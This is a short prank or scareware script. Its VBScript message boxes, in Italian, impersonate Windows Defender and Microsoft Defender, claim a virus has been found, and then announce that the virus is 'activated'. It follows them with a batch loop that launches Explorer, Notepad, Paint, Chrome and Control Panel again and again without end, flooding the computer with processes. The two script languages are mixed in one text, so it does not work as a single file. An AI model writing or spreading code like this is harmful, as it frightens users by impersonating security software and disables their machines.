X=MsgBox("Ciao, ci siamo accorti di un virus nel pc, tocca OK per procedere",0+16,"Windows Defender") 
X=MsgBox("Se vuoi che riprovassimo tocca OK altrimenti tocca Annnulla",1+16,"Microsoft Defender") 
X=MsgBox("Impossibile togliere il virus, riproviamo?",4+16,"Microsoft Defender") 
X=MsgBox("Virus attivato ",0+48,"Microsoft Defender") 
echo off
:x
start explorer
start notepad
start mspaint
start chrome
start control
goto x